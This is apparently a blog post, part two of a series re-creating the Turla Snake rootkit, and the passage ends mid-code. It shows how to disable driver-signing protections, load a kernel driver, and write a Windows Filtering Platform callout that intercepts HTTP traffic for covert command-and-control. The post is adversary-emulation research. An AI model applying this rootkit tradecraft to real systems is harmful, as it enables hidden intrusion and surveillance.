<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Re-creating the Snake Malware Part 002: Starting on the Kernel Driver — PoC</title><style>
      * {
        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
      }
      html, body {
        margin: 0;
        padding: 0;
      }
      h1 {
        font-size: 50px;
        margin-bottom: 17px;
        color: #333;
      }
      h2 {
        font-size: 24px;
        line-height: 1.6;
        margin: 30px 0 0 0;
        margin-bottom: 18px;
        margin-top: 33px;
        color: #333;
      }
      h3 {
        font-size: 30px;
        margin: 10px 0 20px 0;
        color: #333;
      }
      header {
        width: 640px;
        margin: auto;
      }
      section {
        width: 640px;
        margin: auto;
      }
      section p {
        margin-bottom: 27px;
        font-size: 20px;
        line-height: 1.6;
        color: #333;
      }
      section img {
        max-width: 640px;
      }
      footer {
        padding: 0 20px;
        margin: 50px 0;
        text-align: center;
        font-size: 12px;
      }
      .aspectRatioPlaceholder {
        max-width: auto !important;
        max-height: auto !important;
      }
      .aspectRatioPlaceholder-fill {
        padding-bottom: 0 !important;
      }
      header,
      section[data-field=subtitle],
      section[data-field=description] {
        display: none;
      }
      </style></head><body><article class="h-entry">
<header>
<h1 class="p-name">Re-creating the Snake Malware Part 002: Starting on the Kernel Driver — PoC</h1>
</header>
<section data-field="subtitle" class="p-summary">
Obligatory disclaimer: all of the information presented here is for research purposes and should only be used in a legitimate and legal…
</section>
<section data-field="body" class="e-content">
<section name="e4e1" class="section section--body section--first section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="6a4f" id="6a4f" class="graf graf--h3 graf--leading graf--title">Re-creating the Snake Rootkit Part 002: Starting on the Kernel Driver — PoC</h3><figure name="a4dd" id="a4dd" class="graf graf--figure graf-after--h3"><img class="graf-image" data-image-id="0*ACCDpH5D_FXYEuEc.jpg" data-width="736" data-height="1015" data-is-featured="true" src="https://cdn-images-1.medium.com/max/800/0*ACCDpH5D_FXYEuEc.jpg"><figcaption class="imageCaption">Source: <a href="https://www.pinterest.dk/pin/snake-xray--68736826731/" data-href="https://www.pinterest.dk/pin/snake-xray--68736826731/" class="markup--anchor markup--figure-anchor" rel="nofollow noopener" target="_blank">https://www.pinterest.dk/pin/snake-xray--68736826731/</a></figcaption></figure><p name="7a33" id="7a33" class="graf graf--p graf-after--figure"><strong class="markup--strong markup--p-strong">Obligatory disclaimer: all of the information presented here is for research purposes and should only be used in a legitimate and legal manner, the author will not be held responsible for any misdoings or illegal activities.</strong></p><p name="cca9" id="cca9" class="graf graf--p graf-after--p"><em class="markup--em markup--p-em">TL;DR: Rootkit development involves a lot of Microsoft documentation and lack of such and a bunch of trial and error, expect to see many BSODs.</em></p><p name="07fc" id="07fc" class="graf graf--p graf-after--p">In my last post[0]: <a href="https://medium.com/@0x0vid/re-creating-the-snake-malware-part-001-or-how-i-learned-to-stop-worrying-and-love-adversary-78c1447c60f5" data-href="https://medium.com/@0x0vid/re-creating-the-snake-malware-part-001-or-how-i-learned-to-stop-worrying-and-love-adversary-78c1447c60f5" class="markup--anchor markup--p-anchor" target="_blank">Re-creating the Snake Malware Part 001, Or: How I Learned to Stop Worrying and Love Adversary Emulation — The Shopping List</a>, I outlined the details of this project and did some research into Turla and the snake malware. In this post we are going to get started on the basic components of our rootkit: the driver and userland components, we will be implementing a basic Windows Filtering Platform setup and getting kernel-userland communication working!</p><p name="d710" id="d710" class="graf graf--p graf-after--p">We create the most basic PoC possible with the following functionality:</p><ul class="postList"><li name="3bc4" id="3bc4" class="graf graf--li graf-after--p">Extract network data using Windows Filtering Platform (WFP)</li><li name="ce71" id="ce71" class="graf graf--li graf-after--li">Kernel to user mode and vice versa communication</li></ul><p name="5c74" id="5c74" class="graf graf--p graf-after--li">We are doing this part first, as if we can&#39;t get this working it does not matter with the rest as this is critical to the functionality of the Rootkit</p><p name="3d4f" id="3d4f" class="graf graf--p graf-after--p">Please also note that for the following to work there needs to be a server listening for the communication we are trying to send, in this case since we are sending HTTP we have a server running HFS.</p><h3 name="b657" id="b657" class="graf graf--h3 graf-after--p">PoC: our first kernel driver:</h3><h4 name="0735" id="0735" class="graf graf--h4 graf-after--h3">Prerequisite:</h4><p name="e739" id="e739" class="graf graf--p graf-after--h4">To get started with this project we will need to set up a development environment and a virtual machine for the deployment and debugging of the kernel driver. The test environment where we will be running our driver needs to be separate from our development machine as we will be encountering quite a lot of BSODs.</p><p name="87d2" id="87d2" class="graf graf--p graf-after--p">For setting up the development environment in Visual Studio 2022 I more or less just followed the guidelines from Microsoft[1]: <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/writing-a-very-small-kmdf--driver" data-href="https://learn.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/writing-a-very-small-kmdf--driver" class="markup--anchor markup--p-anchor" rel="nofollow noopener noopener" target="_blank">https://learn.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/writing-a-very-small-kmdf--driver</a></p><p name="86cd" id="86cd" class="graf graf--p graf-after--p">Next, to set up the system we have to turn off some of the built-in protection features.</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="bash" name="5cd9" id="5cd9" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-comment"># Allow debugging</span><br />bcdedit /debug on<br /><span class="hljs-comment"># Set the system to testing</span><br />bcdedit /set testsigning on</span></pre><p name="75d9" id="75d9" class="graf graf--p graf-after--pre">Additionally in the BIOS, we need to disable the signature enforcement check, for how to do this follow the instructions in the link below [2]:</p><div name="9fe9" id="9fe9" class="graf graf--mixtapeEmbed graf-after--p"><a href="https://www.partitionwizard.com/partitionmagic/windows-cannot-verify-the-digital-signature.html" data-href="https://www.partitionwizard.com/partitionmagic/windows-cannot-verify-the-digital-signature.html" class="markup--anchor markup--mixtapeEmbed-anchor" title="https://www.partitionwizard.com/partitionmagic/windows-cannot-verify-the-digital-signature.html"><strong class="markup--strong markup--mixtapeEmbed-strong">Fixed: Windows Cannot Verify the Digital Signature Error Code 52 - MiniTool Partition Wizard</strong><br><em class="markup--em markup--mixtapeEmbed-em">This article will introduce the Windows digital signatures and display some solutions to the error that Windows cannot…</em>www.partitionwizard.com</a><a href="https://www.partitionwizard.com/partitionmagic/windows-cannot-verify-the-digital-signature.html" class="js-mixtapeImage mixtapeImage u-ignoreBlock" data-media-id="2dbef80c056d367b901ca3b8a80baf29" data-thumbnail-img-id="0*9BZdMRGF_KyB5TcA" style="background-image: url(https://cdn-images-1.medium.com/fit/c/160/160/0*9BZdMRGF_KyB5TcA);"></a></div><h4 name="e6a8" id="e6a8" class="graf graf--h4 graf-after--mixtapeEmbed">Getting started on the driver</h4><p name="0bd3" id="0bd3" class="graf graf--p graf-after--h4">The initial idea was to do Rust, but that proved to be a pain in my asshole, so we do C++ instead, there is also a lot more documentation for this out there, so probably a good idea. The following code is our Hello World! PoC, and it works.</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="cpp" name="1fcb" id="1fcb" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-comment">// Driver.c</span><br /><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ntddk.h&gt;</span></span><br /><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;wdf.h&gt;</span></span><br /><br />DRIVER_INITIALIZE DriverEntry;<br />EVT_WDF_DRIVER_DEVICE_ADD KmdfHelloWorldEvtDeviceAdd;<br /><br /><span class="hljs-function">NTSTATUS <span class="hljs-title">DriverUnload</span><span class="hljs-params">(_In_ PDRIVER_OBJECT driverObject)</span> </span>{<br />    <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(driverObject);<br /><br />    <span class="hljs-built_in">KdPrint</span>((<span class="hljs-string">&quot;Goodbye World!\n&quot;</span>));<br />    <span class="hljs-keyword">return</span> STATUS_SUCCESS;<br />}<br /><br /><span class="hljs-function">NTSTATUS <span class="hljs-title">DriverEntry</span><span class="hljs-params">(_In_ PDRIVER_OBJECT driverObject, _In_ PUNICODE_STRING registryPath)</span> </span>{<br />    <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(registryPath);<br /><br />    <span class="hljs-built_in">KdPrint</span>((<span class="hljs-string">&quot;Hello World!\n&quot;</span>));<br />    driverObject-&gt;DriverUnload = DriverUnload;<br /><br />    <span class="hljs-keyword">return</span> STATUS_SUCCESS;<br />}</span></pre><p name="5aa5" id="5aa5" class="graf graf--p graf-after--pre">Commands to start the driver as a service</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="swift" name="7dff" id="7dff" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">sc create ku binPath<span class="hljs-operator">=</span><span class="hljs-string">&quot;C:<span class="hljs-subst">\\</span>Users<span class="hljs-subst">\\</span>Ieuser<span class="hljs-subst">\\</span>desktop<span class="hljs-subst">\\</span>KMDF_u.sys&quot;</span> type<span class="hljs-operator">=</span>kernel start<span class="hljs-operator">=</span>demand<br />sc start ku</span></pre><p name="ad34" id="ad34" class="graf graf--p graf-after--pre">And we get a result!</p><figure name="0746" id="0746" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*YkIjuUy1QAUguAH_d7cdgg.png" data-width="868" data-height="244" src="https://cdn-images-1.medium.com/max/800/1*YkIjuUy1QAUguAH_d7cdgg.png"><figcaption class="imageCaption">Successful compile of ICMP WFP driver</figcaption></figure><p name="4925" id="4925" class="graf graf--p graf-after--figure">For me a lot of the time spent on this part of the project was research and trial and error as many of the details involved are quite complex and much of the documentation is either outdated or very old.</p><h3 name="001d" id="001d" class="graf graf--h3 graf-after--p">Fixing build issues</h3><p name="344e" id="344e" class="graf graf--p graf-after--h3">You will likely encounter a ton of different errors when trying to build the driver, and when we expand to add more functionality this will be even more of an issue, to fix most of the issues I encountered I have put together a little collection for help.</p><h4 name="b3d6" id="b3d6" class="graf graf--h4 graf-after--p">Depreciated functions</h4><p name="e804" id="e804" class="graf graf--p graf-after--h4">Here we are suppressing errors for depreciated functions:</p><figure name="29b4" id="29b4" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*EzOwLXvipX38nMi3-1Mmug.png" data-width="826" data-height="336" src="https://cdn-images-1.medium.com/max/800/1*EzOwLXvipX38nMi3-1Mmug.png"><figcaption class="imageCaption">Suppress errors for depreciated functions</figcaption></figure><figure name="6710" id="6710" class="graf graf--figure graf-after--figure"><img class="graf-image" data-image-id="1*gtCbGdaIuC7ig-KPkf27tg.png" data-width="785" data-height="544" src="https://cdn-images-1.medium.com/max/800/1*gtCbGdaIuC7ig-KPkf27tg.png"><figcaption class="imageCaption">Where to edit the configuration</figcaption></figure><h4 name="43ec" id="43ec" class="graf graf--h4 graf-after--figure">Specter-mitigated libraries required</h4><figure name="bcf7" id="bcf7" class="graf graf--figure graf-after--h4"><img class="graf-image" data-image-id="1*67j_cQ1uXHG36J4JSv-Jsg.png" data-width="782" data-height="539" src="https://cdn-images-1.medium.com/max/800/1*67j_cQ1uXHG36J4JSv-Jsg.png"><figcaption class="imageCaption">Fix Specter-mitigations required</figcaption></figure><p name="082a" id="082a" class="graf graf--p graf-after--figure">Disable the highlighted field, the setting can be found under the properties of the solution.</p><h4 name="98cc" id="98cc" class="graf graf--h4 graf-after--p">Unresolved External Symbols</h4><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="javascript" name="6a94" id="6a94" class="graf graf--pre graf-after--h4 graf--preV2"><span class="pre--content">$(<span class="hljs-variable constant_">DDK_LIB_PATH</span>)\fwpkclnt.<span class="hljs-property">lib</span><br />$(<span class="hljs-variable constant_">DDK_LIB_PATH</span>)\ndis.<span class="hljs-property">lib</span><br />$(<span class="hljs-variable constant_">SDK_LIB_PATH</span>)\uuid.<span class="hljs-property">lib</span></span></pre><figure name="abc9" id="abc9" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*I1ilroOhTpeCCP1XAwQ-0g.png" data-width="783" data-height="547" src="https://cdn-images-1.medium.com/max/800/1*I1ilroOhTpeCCP1XAwQ-0g.png"><figcaption class="imageCaption">Fix unresolved external symbols</figcaption></figure><p name="399b" id="399b" class="graf graf--p graf-after--figure">After this, your driver should be able to build successfully.</p><h3 name="b70b" id="b70b" class="graf graf--h3 graf-after--p">Implementing Windows Filtering Platform</h3><p name="4cb7" id="4cb7" class="graf graf--p graf-after--h3">Now that we have our basic driver working, we can then get started on the most difficult part of the project: Dealing with the Windows Filtering Platform (WFP).</p><p name="37f7" id="37f7" class="graf graf--p graf-after--p">To keep it short WFP is a set of APIs that Windows uses to allow for inspection of network content, and is also what the built-in firewall is based on, it is very complex, poorly documented, and has layers of annoyance throughout. It will require a serious dedication of hours to be able to get your head around it and it will still be confusing after that. Now that the introduction is out of the way, I&#39;ll present some of the resources I used to learn about this Microsoft mess and then present how I got it working for what we wanted: intercepting HTTP requests for covert c2 communications.</p><p name="c29d" id="c29d" class="graf graf--p graf-after--p">The whole process is based on this excellent resource on WFP for rootkits by V3ded, his code and associated blog posts can be found below [3][4].</p><div name="8fe4" id="8fe4" class="graf graf--mixtapeEmbed graf-after--p"><a href="https://github.com/V3ded/Blog-Lab" data-href="https://github.com/V3ded/Blog-Lab" class="markup--anchor markup--mixtapeEmbed-anchor" title="https://github.com/V3ded/Blog-Lab"><strong class="markup--strong markup--mixtapeEmbed-strong">GitHub - V3ded/Blog-Lab: Source files for my posts</strong><br><em class="markup--em markup--mixtapeEmbed-em">Source files for my posts. Contribute to V3ded/Blog-Lab development by creating an account on GitHub.</em>github.com</a><a href="https://github.com/V3ded/Blog-Lab" class="js-mixtapeImage mixtapeImage u-ignoreBlock" data-media-id="33a6e6af092e3031a3320b2122b985e3" data-thumbnail-img-id="0*qSjfhSLJ2au8iJLB" style="background-image: url(https://cdn-images-1.medium.com/fit/c/160/160/0*qSjfhSLJ2au8iJLB);"></a></div><div name="8566" id="8566" class="graf graf--mixtapeEmbed graf-after--mixtapeEmbed"><a href="https://v3ded.github.io/redteam/red-team-tactics-writing-windows-kernel-drivers-for-advanced-persistence-part-2" data-href="https://v3ded.github.io/redteam/red-team-tactics-writing-windows-kernel-drivers-for-advanced-persistence-part-2" class="markup--anchor markup--mixtapeEmbed-anchor" title="https://v3ded.github.io/redteam/red-team-tactics-writing-windows-kernel-drivers-for-advanced-persistence-part-2"><strong class="markup--strong markup--mixtapeEmbed-strong">Red Team Tactics: Writing Windows Kernel Drivers for Advanced Persistence (Part 2)</strong><br><em class="markup--em markup--mixtapeEmbed-em">Introduction Hey everyone! Welcome back to the second part of the kernel development series. In my previous post, we…</em>v3ded.github.io</a><a href="https://v3ded.github.io/redteam/red-team-tactics-writing-windows-kernel-drivers-for-advanced-persistence-part-2" class="js-mixtapeImage mixtapeImage u-ignoreBlock" data-media-id="74d2bdd61d57a495c0840861db807ea4" data-thumbnail-img-id="0*61AUbjI8x6mx64L3" style="background-image: url(https://cdn-images-1.medium.com/fit/c/160/160/0*61AUbjI8x6mx64L3);"></a></div><p name="7a1f" id="7a1f" class="graf graf--p graf-after--mixtapeEmbed">Compiling the source code, and installing the driver gives the following result, meaning that we can now intercept ICMP communication:</p><figure name="a32a" id="a32a" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*ojXEwVtB1u_XWke3yvdEOw.png" data-width="1014" data-height="441" src="https://cdn-images-1.medium.com/max/800/1*ojXEwVtB1u_XWke3yvdEOw.png"><figcaption class="imageCaption">Successful interception of ICMP packets</figcaption></figure><p name="a079" id="a079" class="graf graf--p graf-after--figure">However, since we want to do deep packet inspection for TCP/HTTP communications we need to modify the code to suit our needs.</p><h4 name="33df" id="33df" class="graf graf--h4 graf-after--p">Modifying for HTTP inspection</h4><p name="2716" id="2716" class="graf graf--p graf-after--h4">The next step is to go through the code and figure out how we can use it to intercept other forms of communication. Doing a ton of research, head-scratching, and trial and error we now get something that kind of works.</p><p name="c20a" id="c20a" class="graf graf--p graf-after--p">I started off by stripping more or less all the original code away from the callout driver and then started going through everything to see what it does and play around with it.</p><p name="2df0" id="2df0" class="graf graf--p graf-after--p">First, I just wanted a print message when packages were received to check that everything is coming through ok.</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="perl" name="2e13" id="2e13" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">KdPrint((<span class="hljs-string">&quot;got pkage: %d\n&quot;</span>, rawData));</span></pre><p name="ea7e" id="ea7e" class="graf graf--p graf-after--pre">Next, it was time for some more research on how we could go from print statements to basic communications. For this, I found the following resource from Microsoft, that goes through and shows how data can be inspected. The resources are however missing some details on the actual inspection.</p><div name="59ea" id="59ea" class="graf graf--mixtapeEmbed graf-after--p"><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/network/using-a-callout-for-deep-inspection-of-stream-data" data-href="https://learn.microsoft.com/en-us/windows-hardware/drivers/network/using-a-callout-for-deep-inspection-of-stream-data" class="markup--anchor markup--mixtapeEmbed-anchor" title="https://learn.microsoft.com/en-us/windows-hardware/drivers/network/using-a-callout-for-deep-inspection-of-stream-data"><strong class="markup--strong markup--mixtapeEmbed-strong"><em class="markup--em markup--mixtapeEmbed-em">Using a Callout for Deep Inspection of Stream Data</em> - Windows drivers</strong><br>Using a Callout for Deep Inspection of Stream Datalearn.microsoft.com</a><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/network/using-a-callout-for-deep-inspection-of-stream-data" class="js-mixtapeImage mixtapeImage u-ignoreBlock" data-media-id="74be450bd6ed56f6f0031275de303fce" data-thumbnail-img-id="0*MWhjFN-IOw32EUBP" style="background-image: url(https://cdn-images-1.medium.com/fit/c/160/160/0*MWhjFN-IOw32EUBP);"></a></div><p name="60ad" id="60ad" class="graf graf--p graf-after--mixtapeEmbed">But worry not V3ded has us covered! in his blog post and associated code he also shows how data can be inspected. After some more fiddling around with the code we see that we are getting some data, now to get it out of PNET_BUFFER_LIST.</p><p name="b484" id="b484" class="graf graf--p graf-after--p">For the next step let&#39;s investigate some of the data that is provided to the method, the following code is the updated callout function which does very basic data processing</p><pre data-code-block-mode="2" spellcheck="false" data-code-block-lang="cpp" name="366b" id="366b" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">PNET_BUFFER_LIST rawData;<br /><span class="hljs-comment">// Get the pointer to the raw data</span><br />rawData = (PNET_BUFFER_LIST)layerData;<br /><span class="hljs-built_in">KdPrint</span>((<span class="hljs-string">&quot;got pkage\n&quot;</span>));<br /><span class="hljs-comment">// read data</span><br /><span class="hljs-comment">// https://stackoverflow.com/questions/63040275/how-can-i-read-the-received-packets-with-a-ndis-filter-driver</span><br /><span class="hljs-built_in">KdPrint</span>((<span class="hljs-string">&quot;rawData: %d\n&quot;</span>, rawData));<br />NET_BUFFER_LIST_HEADER netBufHeader = rawData-&gt;NetBufferListHeader;<br /><span class="hljs-built_in">KdPrint</span>((<span class="hljs-string">&quot;NetBufferListHeader: %d\n&quot;</span>, netBufHeader));<br /><span class="hljs-built_in">KdPrint</span>((<span class="hljs-string">&quot;NetBuf DataLength: %d\n&quot;</span>, rawData-&gt;NetBufferListHeader.FirstNetBuffer-&gt;DataLength));</span></pre><figure name="ad55" id="ad55" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*Mh0WxXc2EBq9t3Ea0EL7Hg.png" data-width="396" data-height="214" src="https://cdn-images-1.medium.com/max/800/1*Mh0WxXc2EBq9t3Ea0EL7Hg.png"><figcaption class="imageCaption">Print of basic info for the received data</figcaption></figure><p name="483b" id="483b" class="graf graf--p graf-after--figure">Next for a bit of bug fixing! After a lot more messing around we are now able to parse HTTP requests!</p><figure name="05eb" id="05eb" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*DuJUiqJt3_6pobLv6aQQ0A.png" data-width="465" data-height="545" src="https://cdn-images-1.medium.com/max/800/1*DuJUiqJt3_6pobLv6aQQ0A.png"><figcaption class="imageCaption">Printing of — HTTP communication</figcaption></figure><p name="bb16" id="bb16" class="graf graf--p graf-after--figure">For this to happen I used the original ICMP code as a baseline and made some changes the first is the the filtering condition to only allow inbound TCP connections. I have added references in the code for more documentation since more or less everything here is a nested struct in a struct in another struct.</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="go" name="bd4f" id="bd4f" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">    <span class="hljs-comment">// Filter condition structure: https://learn.microsoft.com/en-us/windows/win32/api/fwpmtypes/ns-fwpmtypes-fwpm_filter_condition0</span><br />    <span class="hljs-comment">// Match type: https://learn.microsoft.com/en-us/windows/win32/api/fwptypes/ne-fwptypes-fwp_match_type</span><br />    <span class="hljs-comment">// Condition value: https://learn.microsoft.com/en-us/windows/win32/api/fwptypes/ns-fwptypes-fwp_condition_value0</span><br />    <span class="hljs-comment">// Condition identifier: https://learn.microsoft.com/en-us/windows/win32/fwp/filtering-condition-identifiers-</span><br />    FWPM_FILTER_CONDITION0 conditions[<span class="hljs-number">2</span>] =<br />    {<br />      {FWPM_CONDITION_IP_PROTOCOL, {<span class="hljs-number">0x6</span>}, {<span class="hljs-number">0x0</span>}},     <span class="hljs-comment">// TCP  (0x6)</span><br />      {FWPM_CONDITION_DIRECTION, {FWP_DIRECTION_INBOUND}, {FWP_DIRECTION_INBOUND}}, <span class="hljs-comment">// Only capture incomming traffic</span><br />    };<br />    FWPM_FILTER filter = {<br />      .displayData.name = L<span class="hljs-string">&quot;SN3K drivr&quot;</span>,<br />      .displayData.name = L<span class="hljs-string">&quot;SN3K drivr Description&quot;</span>,<br />      .layerKey = FWPM_LAYER_INBOUND_TRANSPORT_V4,  <span class="hljs-comment">// Needs to work on the same layer as our added callout</span><br />      .subLayerKey = SUB_LAYER_GUID,                   <span class="hljs-comment">// Unique GUID that identifies the sublayer, GUID needs to be the same as the GUID of the added sublayer</span><br />      .weight = weight,                           <span class="hljs-comment">// Weight variable, higher weight means higher priority</span><br />      .numFilterConditions = <span class="hljs-number">0</span>,                                <span class="hljs-comment">// Number of filter conditions (0 because conditions variable is empty)</span><br />      .filterCondition = conditions,                       <span class="hljs-comment">// Empty conditions structure (we don&#x27;t want to do any filtering) </span><br />      .action.<span class="hljs-keyword">type</span> = FWP_ACTION_CALLOUT_INSPECTION,    <span class="hljs-comment">// We only want to inspect the packet (https://learn.microsoft.com/en-us/windows/win32/api/fwpmtypes/ns-fwpmtypes-fwpm_action0)</span><br />      .action.calloutKey = CALLOUT_GUID                      <span class="hljs-comment">// Unique GUID that identifies the callout, GUID needs to be the same as the GUID of the added callout</span><br />    };</span></pre><p name="8a95" id="8a95" class="graf graf--p graf-after--pre">The second was the extraction of the data, this was changed to match TCP instead of ICMP.</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="java" name="ce2d" id="ce2d" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">VOID NTAPI <span class="hljs-title function_">ClassifyFn</span><span class="hljs-params">(<br />    const FWPS_INCOMING_VALUES* inFixedValues,<br />    const FWPS_INCOMING_METADATA_VALUES* inMetaValues,<br />    <span class="hljs-keyword">void</span>* layerData,<br />    const <span class="hljs-keyword">void</span>* classifyContext,<br />    const FWPS_FILTER* filter,<br />    UINT64  flowContext,<br />    FWPS_CLASSIFY_OUT* classifyOut<br />)</span><br />{<br />    UNREFERENCED_PARAMETER(inFixedValues);<br />    UNREFERENCED_PARAMETER(inMetaValues);<br />    UNREFERENCED_PARAMETER(layerData);<br />    UNREFERENCED_PARAMETER(classifyContext);<br />    UNREFERENCED_PARAMETER(filter);<br />    UNREFERENCED_PARAMETER(flowContext);<br />    UNREFERENCED_PARAMETER(classifyOut);<br /><br />    <span class="hljs-comment">// Data validation</span><br />    <span class="hljs-keyword">if</span> (!layerData) { <span class="hljs-comment">// Can sometimes be NULL according to documentation</span><br />        <span class="hljs-keyword">return</span>;<br />    }<br />    <span class="hljs-keyword">if</span> (inMetaValues-&gt;ipHeaderSize &lt;= <span class="hljs-number">0</span>) { <span class="hljs-comment">// Probably needed?</span><br />        <span class="hljs-keyword">return</span>;<br />    }<br /><br /><br />    PNET_BUFFER_LIST rawData;<br />    <span class="hljs-comment">// Get the pointer to the raw data</span><br />    rawData = (PNET_BUFFER_LIST)layerData;<br />    KdPrint((<span class="hljs-string">&quot;got pkage\n&quot;</span>));<br />    <span class="hljs-comment">// read data</span><br />    <span class="hljs-comment">// https://stackoverflow.com/questions/63040275/how-can-i-read-the-received-packets-with-a-ndis-filter-driver</span><br />    KdPrint((<span class="hljs-string">&quot;rawData: %d\n&quot;</span>, rawData));<br />    <span class="hljs-type">NET_BUFFER_LIST_HEADER</span> <span class="hljs-variable">netBufHeader</span> <span class="hljs-operator">=</span> rawData-&gt;NetBufferListHeader;<br />    KdPrint((<span class="hljs-string">&quot;NetBufferListHeader: %d\n&quot;</span>, netBufHeader));<br />    KdPrint((<span class="hljs-string">&quot;NetBuf DataLength: %d\n&quot;</span>, rawData-&gt;NetBufferListHeader.FirstNetBuffer-&gt;DataLength));<br />    <span class="hljs-comment">//KdPrint((&quot;read byte: %d\n&quot;, ReadUCharRaw(rawData-&gt;FirstNetBuffer-&gt;DataOffset)));</span><br /><br />    <span class="hljs-comment">// taken from ICMP example</span><br />    NET_BUFFER_LIST* fragmentList = (NET_BUFFER_LIST*)layerData;<br /><br />    <span class="hljs-comment">// Note: the linked list should ONLY be accessed through macros such as &#x27;NET_BUFFER_LIST_FIRST_NB()&#x27; (https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/nbl/ns-nbl-net_buffer_list)</span><br />    NET_BUFFER* firstFragment = NET_BUFFER_LIST_FIRST_NB(fragmentList);<br /><br />    UNREFERENCED_PARAMETER(firstFragment);<br />    <br />    <span class="hljs-type">ULONG</span> <span class="hljs-variable">tcpLength</span> <span class="hljs-operator">=</span> firstFragment-&gt;DataLength;<br /><br />    <span class="hljs-type">UINT32</span> <span class="hljs-variable">dataLength</span> <span class="hljs-operator">=</span> tcpLength - <span class="hljs-number">0x20</span>;             <span class="hljs-comment">// ICMP data size    = ICMP packet size - ICMP header size    </span><br />    <span class="hljs-type">UINT32</span> <span class="hljs-variable">payloadLength</span> <span class="hljs-operator">=</span> dataLength - <span class="hljs-number">4</span> - <span class="hljs-number">1</span>;<br />    <span class="hljs-comment">// Data needs to have at least 5 bytes (length of the password - 1) and not exceed 1472 bytes (max ICMP data size before fragmentation)</span><br />    <span class="hljs-comment">// TCP fragmentation: https://www.baeldung.com/cs/tcp-max-packet-size#:~:text=The%20maximum%20size%20of%20a,size%20should%20never%20exceed%20MTU.</span><br />    <span class="hljs-keyword">if</span> (dataLength &lt;= <span class="hljs-number">4</span> || dataLength &gt;= <span class="hljs-number">65535</span>) {<br />        KdPrint((<span class="hljs-string">&quot;  - [!] Discarding the packet due to invalid data length (%d).\n&quot;</span>, dataLength));<br />        <span class="hljs-keyword">return</span>;<br />    }<br />    UNREFERENCED_PARAMETER(payloadLength);<br />    <span class="hljs-comment">// Allocate memory for the ICMP packet</span><br />    <span class="hljs-type">PVOID</span> <span class="hljs-variable">packageBuffer</span> <span class="hljs-operator">=</span> ExAllocatePoolWithTag(POOL_FLAG_NON_PAGED, (SIZE_T)dataLength, ALLOC_TAG_NAME); <span class="hljs-comment">// Tag name is defined in &quot;Config.h&quot;</span><br />    <span class="hljs-keyword">if</span> (!packageBuffer) {<br />        <span class="hljs-keyword">return</span>;<br />    }<br />    <span class="hljs-comment">// Read the bytes of the ICMP packet</span><br />    <span class="hljs-type">PBYTE</span> <span class="hljs-variable">packet</span> <span class="hljs-operator">=</span> (PBYTE)NdisGetDataBuffer(firstFragment, (ULONG)dataLength, packageBuffer, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br />    UNREFERENCED_PARAMETER(packet);<br />    <br />    <span class="hljs-comment">// If the packet is not valid then we are discarding the request</span><br />    <span class="hljs-keyword">if</span> (!packet) {<br />        ExFreePoolWithTag((PVOID)packageBuffer, ALLOC_TAG_NAME);<br />        <span class="hljs-keyword">return</span>;<br />    }<br />    <span class="hljs-comment">// Allocate memory for the payload</span><br />    <span class="hljs-type">LPSTR</span> <span class="hljs-variable">tcpPayload</span> <span class="hljs-operator">=</span> ExAllocatePoolWithTag(POOL_FLAG_NON_PAGED, (SIZE_T)(payloadLength + <span class="hljs-number">1</span>), ALLOC_TAG_NAME); <span class="hljs-comment">//+1 for &#x27;\0&#x27;</span><br />    <span class="hljs-keyword">if</span> (!tcpPayload) {<br />        <span class="hljs-keyword">return</span>;<br />    }<br />    <span class="hljs-comment">// Extract the payload from the ICMP packet (bytes after the flag)</span><br />    RtlZeroMemory(tcpPayload, payloadLength + <span class="hljs-number">1</span>);<br />    RtlCopyMemory(tcpPayload, &amp;packet[<span class="hljs-number">0</span>], payloadLength);<br /><br />    <span class="hljs-comment">// Null terminate the payload for extra safety</span><br />    tcpPayload[payloadLength] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br />    KdPrint((<span class="hljs-string">&quot;packet: %s\n&quot;</span>, tcpPayload));<br />}</span></pre><p name="b64a" id="b64a" class="graf graf--p graf-after--pre">Again since we are dealing with kernel drivers expect a lot of BSOD and the need for a ton of error handling</p><h4 name="cc15" id="cc15" class="graf graf--h4 graf-after--p">Basic filtering</h4><p name="9270" id="9270" class="graf graf--p graf-after--h4">Not the proper way, we do that when we get to the “ustart” method, and then figure out where that is going to live.</p><p name="92b7" id="92b7" class="graf graf--p graf-after--p">We are doing a basic check to see if this is a GET request:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="kotlin" name="058d" id="058d" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">    <span class="hljs-comment">// Null terminate the payload for extra safety</span><br />    tcpPayload[payloadLength] = <span 